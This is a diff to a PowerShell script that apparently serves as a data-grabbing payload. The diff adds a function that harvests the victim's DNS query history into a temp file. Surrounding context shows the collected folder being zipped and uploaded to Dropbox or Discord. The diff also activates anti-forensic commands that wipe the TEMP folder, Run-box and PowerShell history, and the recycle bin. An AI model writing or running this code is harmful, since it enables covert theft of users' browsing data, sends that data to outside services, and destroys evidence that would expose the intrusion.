@@ -528,6 +528,54 @@ Start-Process -FilePath $pathToChrome
 
 ############################################################################################################################################################
 
+#Get dns logs
+
+function Get-DnsRequests {
+
+    [CmdletBinding()]
+    param (
+        [Parameter(Position = 1, Mandatory = $True)]
+        [string]$LogFile
+    )
+
+    # DNS Event Log Parameters
+    $EventLogName = "Microsoft-Windows-DNS-Client/Operational"
+    $EventID = 3008  # DNS Query Event ID
+
+    # Ensure the DNS Client log is enabled
+    if (-not (Get-WinEvent -LogName $EventLogName -ErrorAction SilentlyContinue)) {
+        Write-Host "The DNS Client Operational log is not enabled or does not exist."
+        return
+    }
+
+    # Get DNS query events from the DNS Client Operational log
+    $dnsEvents = Get-WinEvent -LogName $EventLogName | Where-Object { $_.Id -eq $EventID }
+
+    # Write the DNS requests to the specified log file
+    $dnsEvents | ForEach-Object {
+        $queryName = $_.Properties[0].Value  # The DNS query name
+        $timestamp = $_.TimeCreated           # Timestamp of the event
+
+        # Format the output
+        $output = New-Object PSObject -Property @{
+            User      = $env:USERNAME
+            TimeStamp = $timestamp
+            Query     = $queryName
+        }
+
+        # Write the output to the log file
+        $output | Out-File -FilePath $LogFile -Append
+    }
+    
+    Write-Host "DNS requests have been logged to $LogFile."
+}
+
+#Log DNS requests to a file
+$logFilePath = "$env:TMP\DnsRequests.txt"
+Get-DnsRequests -LogFile $logFilePath
+
+############################################################################################################################################################
+
 Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
 
 # Upload output file to dropbox
@@ -584,19 +632,19 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
 
 # Delete contents of Temp folder 
 
-# rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 # Delete run box history
 
-# reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
 # Delete powershell history
 
-# Remove-Item (Get-PSreadlineOption).HistorySavePath
+Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 # Deletes contents of recycle bin
 
-# Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 		
 ############################################################################################################################################################
